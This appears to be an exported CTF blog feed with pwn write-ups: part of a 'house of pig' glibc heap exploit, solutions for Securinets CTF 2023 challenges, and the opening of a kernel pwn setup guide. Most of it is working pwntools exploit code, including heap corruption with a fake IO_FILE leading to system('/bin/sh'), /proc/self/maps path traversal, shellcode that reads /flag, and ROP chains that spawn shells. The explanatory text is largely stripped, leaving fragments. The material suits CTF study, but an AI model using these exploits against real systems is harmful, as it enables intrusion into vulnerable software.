class="comment">#B8fd_nextsizebk_nextsize</span></span><br><span class="line">Edit(<span class="number">8</span>,<span class="number">2</span>*p64(heap_base + <span class="number">0x13e80</span>)+ <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----- second largebin_attac</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#largebin attach0xa0unsortedbin</span></span><br><span class="line">Add(<span class="number">0x380</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">19</span>)<span class="comment"># A19</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(IO_list_all-<span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#,largebinattach IO_list_all</span></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#B8fd_nextsizebk_nextsize</span></span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- tcache_stashing_unlink_attack and FILE attack</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#uafA8smallbinfdbk,0x480x160x500x48*(0x50//16)=0xf0smallbinfd bk</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span> + p64(heap_base+<span class="number">0x12280</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">Edit(<span class="number">8</span>, payload + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(heap_base+<span class="number">0x147c0</span>)</span><br><span class="line"><span class="comment">#iolistalllargebin,FILEchainsmallbin</span></span><br><span class="line">Add(<span class="number">0x440</span>, payload)<span class="comment">#C3</span></span><br><span class="line"><span class="comment">#tcache_stashing_unlink_attack0xa0free_hook-0x10tcache</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b calloc&#x27;)</span></span><br><span class="line">Add(<span class="number">0x90</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># C4</span></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1e9560</span></span><br><span class="line">system_addr = libc_base + libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>) <span class="comment">#fp-&gt;flag=0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line"><span class="comment">#fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148a0</span>)                <span class="comment">#v4 _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148b8</span>)                <span class="comment">#v5 _IO_buf_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable</span></span><br><span class="line">payload = fake_IO_FILE + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span>*p64(system_addr)</span><br><span class="line"><span class="comment">#gift calloc(1uLL, 0xE8uLL);smallbinchain</span></span><br><span class="line">sa(<span class="string">&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">b()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>exit</p><p><img src="/2023/08/12/house-of-pig/image-20230813173155790.png" alt="image-20230813173155790"></p><p><img src="/2023/08/12/house-of-pig/image-20230813173349353.png" alt="image-20230813173349353"></p><p><img src="/2023/08/12/house-of-pig/image-20230813173329624.png" alt="image-20230813173329624"></p><p>exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow</p><p>malloc(2 * ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) + 100)&#x3D;malloc(0x94)free hook-0x10</p><p>memcpysystemfree_hookfree (old_buf);system(&#x2F;bin&#x2F;sh)</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://blog.csdn.net/mozibai666/article/details/120121891">https://blog.csdn.net/mozibai666/article/details/120121891</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 Securinets CTF Quals</title>
      <link href="/2023/08/10/2023-securinets-ctf/"/>
      <url>/2023/08/10/2023-securinets-ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Admin-Service"><a href="#Admin-Service" class="headerlink" title="Admin Service"></a>Admin Service</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/S/A/togive&gt; checksec ./services</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/Admin Service/togive/services&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;./&#x27;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/S/A/togive&gt; seccomp-tools dump ./services</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x00000038  if (A == clone) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000039  if (A == fork) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x0000003a  if (A == vfork) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>readChat&#x2F;proc&#x2F;self&#x2F;mapsupdateConfig</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./services&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcfg</span>(<span class="params">idx, v</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Config index:&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.send(v)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readchat</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Chat ID:\n&quot;</span>, name)</span><br><span class="line">dbpie(<span class="string">&#x27;0x016D6&#x27;</span>)</span><br><span class="line">readchat(<span class="string">b&#x27;../../../../../../../../../proc/self/maps&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;55cc2374d000&#x27;</span>)),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">backupCode=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;7fa5dd3e7000&#x27;</span>)),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">p(<span class="string">&#x27;backupCode&#x27;</span>,backupCode)</span><br><span class="line">config=<span class="number">0x4060</span>+pie</span><br><span class="line">setcfg((<span class="number">0x4070</span>-<span class="number">0x4060</span>)//<span class="number">8</span>,p64(<span class="number">0x20C2</span>+pie))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">buffer=elf.bss()+pie+<span class="number">0x100</span></span><br><span class="line">pld = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>,buffer, <span class="number">0x50</span>) + shellcraft.write(<span class="number">1</span>,buffer,<span class="number">0x50</span>)) </span><br><span class="line"><span class="built_in">print</span>(pld)</span><br><span class="line">setcfg((<span class="number">0x40A8</span>-<span class="number">0x4060</span>)//<span class="number">8</span>,p64(backupCode))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pld), <span class="number">8</span>):</span><br><span class="line">    setcfg((backupCode-(<span class="number">0x4060</span>+pie))//<span class="number">8</span>+i//<span class="number">8</span>, pld[i:i+<span class="number">8</span>])</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">sla(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230813211518532.png" alt="image-20230813211518532"></p><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/S/r/togive&gt; checksec main</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/ret2libc/togive/main&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8047000)</span><br><span class="line">    RUNPATH:  b&#x27;./&#x27;</span><br></pre></td></tr></table></figure><p>ecxespretebpretespret</p><p>gets\n\x00esp00espgetspayloadrettop</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">080491</span>D3 <span class="number">8</span>D <span class="number">4</span>C <span class="number">24</span> <span class="number">04</span>                   lea     ecx, [esp+<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080491</span>D7 <span class="number">83</span> E4 F0                      and     esp, <span class="number">0F</span>FFFFFF0h</span><br><span class="line">.text:<span class="number">080491</span>DA FF <span class="number">71</span> FC                      push    dword ptr [ecx<span class="number">-4</span>]</span><br><span class="line">.text:<span class="number">080491</span>DD <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">080491</span>DE <span class="number">89</span> E5                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">080491E0</span> <span class="number">53</span>                            push    ebx</span><br><span class="line">.text:<span class="number">080491E1</span> <span class="number">51</span>                            push    ecx</span><br><span class="line">.text:<span class="number">080491E2</span> <span class="number">83</span> EC <span class="number">50</span>                      sub     esp, <span class="number">50</span>h</span><br><span class="line">.text:<span class="number">080491E5</span> E8 C6 FE FF FF                call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:<span class="number">080491E5</span></span><br><span class="line">.text:<span class="number">080491</span>EA <span class="number">81</span> C3 <span class="number">0</span>A <span class="number">2</span>E <span class="number">00</span> <span class="number">00</span>             add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:<span class="number">080491F</span>0 E8 <span class="number">81</span> FF FF FF                call    setup</span><br><span class="line">.text:<span class="number">080491F</span>0</span><br><span class="line">.text:<span class="number">080491F</span>5 <span class="number">83</span> EC <span class="number">0</span>C                      sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">080491F</span>8 <span class="number">8</span>D <span class="number">83</span> <span class="number">14</span> E0 FF FF             lea     eax, (aIsThisSolveabl - <span class="number">804B</span>FF4h)[ebx] ; <span class="string">&quot;Is this solveable?&quot;</span></span><br><span class="line">.text:<span class="number">080491F</span>E <span class="number">50</span>                            push    eax                             ; s</span><br><span class="line">.text:<span class="number">080491F</span>F E8 <span class="number">4</span>C FE FF FF                call    _puts</span><br><span class="line">.text:<span class="number">080491F</span>F</span><br><span class="line">.text:<span class="number">08049204</span> <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08049207</span> <span class="number">83</span> EC <span class="number">0</span>C                      sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0804920</span>A <span class="number">8</span>D <span class="number">45</span> A8                      lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">0804920</span>D <span class="number">50</span>                            push    eax                             ; s</span><br><span class="line">.text:<span class="number">0804920</span>E E8 <span class="number">2</span>D FE FF FF                call    _gets</span><br><span class="line">.text:<span class="number">0804920</span>E</span><br><span class="line">.text:<span class="number">08049213</span> <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08049216</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0804921B</span> <span class="number">8</span>D <span class="number">65</span> F8                      lea     esp, [ebp<span class="number">-8</span>]</span><br><span class="line">.text:<span class="number">0804921</span>E <span class="number">59</span>                            pop     ecx</span><br><span class="line">.text:<span class="number">0804921F</span> <span class="number">5B</span>                            pop     ebx</span><br><span class="line">.text:<span class="number">08049220</span> <span class="number">5</span>D                            pop     ebp</span><br><span class="line">.text:<span class="number">08049221</span> <span class="number">8</span>D <span class="number">61</span> FC                      lea     esp, [ecx<span class="number">-4</span>]</span><br><span class="line">.text:<span class="number">08049224</span> C3                            retn</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io=remote(<span class="string">&#x27;pwn.ctf.securinets.tn&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line">        <span class="comment"># io=process(pwnfile)</span></span><br><span class="line">        ret=<span class="number">0x804923B</span></span><br><span class="line">        padding=p32(ret)*((<span class="number">0x50</span>-<span class="number">12</span>)//<span class="number">4</span>)</span><br><span class="line">        payload=flat(padding,</span><br><span class="line">                    elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">                    elf.sym[<span class="string">&#x27;main&#x27;</span>],</span><br><span class="line">                    elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">                    )</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;solveable?&#x27;</span>,payload)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        puts_ad=io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>,drop=<span class="literal">False</span>,timeout=<span class="number">4</span>)</span><br><span class="line">        puts_ad=uu32(puts_ad)</span><br><span class="line">        <span class="keyword">if</span>(puts_ad!=<span class="number">0</span>):</span><br><span class="line">          <span class="comment"># gdb.attach(io,&#x27;b *0x8049216&#x27;)</span></span><br><span class="line">          libcbase=puts_ad-libcelf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">          system_ad=libcbase+libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">          binsh=libcbase+<span class="built_in">next</span>(libcelf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">          payload=flat(padding,</span><br><span class="line">                    system_ad,</span><br><span class="line">                    elf.sym[<span class="string">&#x27;main&#x27;</span>],</span><br><span class="line">                    binsh</span><br><span class="line">                    )</span><br><span class="line">          io.sendlineafter(<span class="string">b&#x27;solveable?&#x27;</span>,payload)</span><br><span class="line">          io.interactive()</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810183252407.png" alt="image-20230810183252407"></p><h2 id="One-is-enough"><a href="#One-is-enough" class="headerlink" title="One is enough"></a>One is enough</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/One is enough/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>readInputmainrbpsyscallgadgetrbpmainrop</p><p> readDescriptionmemMovemainrbp16</p><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810223319615.png" alt="image-20230810223319615"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># db(&#x27;0x401866&#x27;)</span></span><br><span class="line">    <span class="comment"># db(&#x27;0x040186B&#x27;)</span></span><br><span class="line">    pop_rax=<span class="number">0x0000000000431c77</span></span><br><span class="line">    pop_rsi=<span class="number">0x000000000040ab23</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401f3d</span></span><br><span class="line">    pop_rdx_rbx=<span class="number">0x0000000000463367</span></span><br><span class="line">    syscall=<span class="number">0x00000000004121e2</span></span><br><span class="line">    padding=cyclic(<span class="number">0x100</span>-<span class="number">0xf0</span>)</span><br><span class="line">    payload=flat(<span class="number">0xdeadbeef</span>,</span><br><span class="line">                pop_rdi,<span class="number">0</span>,pop_rsi,elf.bss()+<span class="number">0x100</span>,pop_rdx_rbx,<span class="number">59</span>,<span class="number">0</span>,elf.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">                pop_rdi,elf.bss()+<span class="number">0x100</span>,pop_rsi,<span class="number">0</span>,pop_rdx_rbx,<span class="number">0</span>,<span class="number">0</span>,syscall)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;tion:&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload=cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x30&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;rname:&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810222406110.png" alt="image-20230810222406110"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn </title>
      <link href="/2023/08/08/first-kernelpwn/"/>
      <url>/2023/08/08/first-kernelpwn/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar">CISCN2017-babydriver</a></p><h3 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a><a href="https://zh.wikipedia.org/wiki/BusyBox">busybox</a></h3><p></p><p><a href="https://www.busybox.net/">https://www.busybox.net/</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>busybox</p><p><img src="/2023/08/08/first-kernelpwn/image-20230808234139406.png" alt="image-20230808234139406"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">make -j6</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>busybox</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -j4 CROSS_COMPILE = </span><br></pre></td></tr></table></figure><p>(_install)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p  proc sys dev 